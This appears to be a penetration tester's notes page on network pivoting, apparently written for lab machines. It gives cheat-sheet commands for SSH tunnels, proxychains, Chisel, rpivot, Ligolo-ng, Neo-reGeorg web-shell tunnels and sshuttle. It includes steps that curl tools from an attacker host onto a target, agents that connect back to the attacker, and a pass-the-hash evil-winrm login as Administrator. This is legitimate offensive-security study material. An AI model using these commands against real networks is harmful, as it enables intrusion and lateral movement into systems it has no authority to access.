---
layout: notes
permalink: /notes/network/pivot/
title: Network Pivoting
---

# Network Pivoting

## SSH Tunneling
```bash
# Local port forwarding
ssh -L 8080:internal_host:80 user@pivot_ip

# Remote port forwarding
ssh -R 8080:local_host:80 user@pivot_ip

# Dynamic port forwarding (SOCKS proxy)
ssh -D 1080 user@pivot_ip

# Bind to all interfaces
ssh -g -L 0.0.0.0:8080:internal_host:80 user@pivot_ip
```

## Proxy Chains
```bash
# Set up proxychains
proxychains nmap -sT internal_host

# Configure proxy list
echo "socks5 192.168.1.10 1080" > /etc/proxychains.conf

# Test proxy chain
proxychains curl internal_host

# Use multiple proxies
proxychains -q nmap -sT internal_host
```

## VPN Pivoting
```bash
# Start OpenVPN client
openvpn client.ovpn

# Route traffic via VPN
route add <network> <vpn_gateway>

# Verify VPN connection
ipconfig

# Use SoftEther VPN
vpnclient /cmd
```

## Pivoting Tools
- Chisel: ```chisel client <attacker_ip>:8080 R:12345:internal_host:80```
- Plink: ```plink -L 8080:internal_host:80 user@pivot_ip```
- SSHuttle: ```sshuttle -r user@pivot_ip 192.168.1.0/24```
- Proxychains-ng: ```proxychains-ng nmap internal_host```
- Meterpreter: ```use multi/manage/autoroute```

## Examples

### Basic with SSH + Proxychains
We have following hosts which are not accessible from our Kali:
```bash
192.168.98.30 -> Windows host
192.168.98.2 -> DC
```
Make sure to install and prepare proxychains:
```bash
sudo apt-get install proxychains
nano /etc/proxychains.conf:
    • Comment "strict_chain"
add Socks5 and socks4:
    • socks5 127.0.0.1 9050
    • socks4 127.0.0.1 9050
```

We will make a tunnel via the accessible machine:
```bash
Kali ->  192.168.80.10 -> 192.168.98.*
```

Execute ssh command:
```bash
ssh -D 9050 privilege@192.168.80.10
proxychains nc 192.168.98.30 445
```
We have a connection!

### RPIVOT (analog Chisel)
Make sure your environment have the python tool
```
conda create -n rpivot python=2.7
```

Navigate to the folder where rpivot.zip

Start the python http server in this folder
```
python3 -m http.server
```

Connect the target machine

Upload the rpivot.zip to the target machine using the curl
```
cd /tmp
curl http://10.10.200.2:8000/rpivot.zip --output rpivot.zip
unzip rpivot.zip
cd rpivot-master
```

Prepare the server below and connect this client
```
python2 client.py --server-ip 10.10.200.2 --server-port 9980
```

On attacker machine start the rpivot server

Navigate to the rpivot-master folder:
```
python2 server.py --server-port 9980 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 9050
```
If you have some problem, comment the socks5 in the /etc/proxychains.conf

### Ligolo-ng
Your machine 
```
$ sudo ip link del ligolo
$ sudo ip tuntap add user $(whoami) mode tun ligolo
$ sudo ip link set ligolo up
$ sudo ip route add 172.16.20.0/24 dev ligolo
$ ligolo-proxy -selfcert
```

Excute that agent command okay then you will get the session
```
ligol-ng >> session 
choose 1
[Agent : ebelford@drip] » start
```

Remote Machine
```
chmod +x agent
./agent -connect 10.10.xx.xx:11601 -ignore-cert
```
now without proxychain you can do ping,nmap etc

### Neo-reGeorg
[Neo-reGeorg](https://github.com/L-codes/Neo-reGeorg)
```
python3 neoreg.py generate -k thm
```
Upload generated any tunnel file that application use as a framework (e.g. tunnel.php)
Access the tunnel file using neoreg.ph:
```
python3 neoreg.py -k thm -u http://10.10.11.140/uploader/files/tunnel.php
```
Access the server that only available from tunnel (use only socks5)
```
curl --socks5 127.0.0.1:1080 http://172.20.0.121:80
```

### Sshuttle
```
git clone https://github.com/sshuttle/sshuttle.git
cd sshuttle

./run -r ebelford@ip -N 172.16.20.0/24

sshuttle -r ebelford@ip -N 172.16.20.0/24
password: ************
c : Connected to server.
```

New terminal 
```
evil-winrm -i 172.16.20.2 -u Administrator -H '<HASH>'
```